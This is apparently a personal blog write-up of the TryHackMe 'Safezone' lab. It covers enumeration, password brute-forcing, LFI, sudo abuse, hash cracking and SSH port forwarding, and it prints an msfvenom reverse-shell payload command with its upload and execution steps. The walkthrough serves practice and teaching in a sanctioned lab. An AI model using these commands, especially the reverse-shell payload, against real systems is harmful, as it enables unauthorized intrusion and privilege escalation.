---
author:
  name: "papadope"
date: 2021-03-31
linktitle: Safezone
type:
- post
title: Safezone
weight: 10
series:
- Tryhackme
---

![Room Image](/safezone/room.png)

## Enumeration

![nmap](/safezone/nmap.png)

Nmap scan.

---

![ferox](/safezone/ferox.png)

---

### More than enough

![ferox](/safezone/ferox1.png)

Why that *wordlist*?
I didn't knew about that but I dmed in Discord a friend of mine and told me to search with that wordlist.
Then I remember that in Apache there is a setting where it includes home directories in it's file system.

![apache](/safezone/apache.png)

---

## Foothold

After reading the file inside the home directory we now know that we miss 2 numbers between the password **admin _ _ admin**.
I wrote a python script to brute force the password but it's really slow cause if you try more than 3 times in 60 seconds you are going to get blocked. You can read the script [here](https://raw.githubusercontent.com/Papadope/Safezone_Script/main/greatbruteforcer.py).

After getting the right pass, log in with it.
Do you remember that?

![page](/safezone/page.png)

You can exploit the LFI now on the **detail.php**. After that it's easy to get a RS in the box.

## Privesc #1

You logged in as **www-data** and you can instantly go for **sudo -l**. The link you need is [here](https://gtfobins.github.io/gtfobins/find/#sudo).

## Privesc #2

Now you are the user **files**. There is a file called **'.something#fake_can@be^here'**. Crack the hash with rockyou and log in with SSH. 

After searching for something useful (and no I am not talking about sudo -l, yes I saw that too) there is a service on localport.

Port forward it 

```

ssh -L 8000:127.0.0.1:8000 files@safezone.thm -N -f

```

* You already have the password if you cracked the hash.

Searching for directories in the service I forwarded led me in a file:
* login.html

And this file, by looking inside led me to another file:
* pentest.php

### Creating the shell.

```

msfvenom -p linux/x86/shell_reverse_tcp LHOST=108.59.209 LPORT=1234 -f elf > candy

```

And then 3 more things.

* CP -> **scp candy files@safezone.thm:/tmp/**
* Login -> **ssh files@safezone.thm**
* CHMOD -> **chmod +x /tmp/candy**

Inside the field of the pentest.php page go for **/tmp/candy** and wait for a shell on your NC Listener.

## Privesc #3

You are now the user **yash**. Doing a **sudo -l** I saw that there is a file called **bk.py**. You can run it as root but you can't do anything else. I followed exactly what the file told me to do.

* Enter filename: /root/*
* Enter destination: /home/yash/root_flag
* Enter password: 1234

Then you can **cat root_flag** and get the root flag.

Thank you very much for reading.